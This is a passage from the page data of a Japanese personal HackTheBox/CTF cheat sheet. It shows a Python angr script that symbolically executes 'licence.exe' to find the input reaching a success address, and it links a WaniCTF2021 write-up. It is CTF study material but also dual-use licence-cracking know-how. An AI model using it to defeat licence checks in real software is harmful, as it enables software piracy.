0x405dc2, 0x405de8, 0x405e1e, 0x405e4b]</span>\n\n<span class=\"token comment\"># create project</span>\nproj <span class=\"token operator\">=</span> angr<span class=\"token punctuation\">.</span>Project<span class=\"token punctuation\">(</span><span class=\"token string\">'licence.exe'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># initial_state at the entry point of the binary</span>\ninit_state <span class=\"token operator\">=</span> proj<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>entry_state<span class=\"token punctuation\">(</span>args <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'licence.exe'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'key.dat'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># create simulation</span>\nsimgr <span class=\"token operator\">=</span> proj<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>simgr<span class=\"token punctuation\">(</span>init_state<span class=\"token punctuation\">)</span>\n\nsimgr<span class=\"token punctuation\">.</span>explore<span class=\"token punctuation\">(</span>find<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x405e57</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> avoid<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x405e86</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>simgr<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>simgr<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>simgr<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> results <span class=\"token keyword\">in</span> simgr<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>results<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p>参考：<a href=\"ctf-angr-bigginer\">angrによるシンボリック実行でRev問を解いてみたまとめ【WaniCTF2021】 - かえるのひみつきち</a></p>","fields":{"slug":"/cheatsheet-main","tagSlugs":["/tag/hack-the-box/","/tag/cheet-sheet/"]},"frontmatter":{"date":"2022-06-11","description":"HackTheBox用のチートシートのまとめページ","tags":["HackTheBox","CheetSheet"],"title":"【個人用】HackTheBox/CTF用のチートシートまとめ(作成中)","socialImage":{"publicURL":"/static/dc4d8b7f8795f3c3d3489d9957d155f2/no-image.png"}}}},"pageContext":{"slug":"/cheatsheet-main"}},"staticQueryHashes":["251939775","401334301","825871152"]}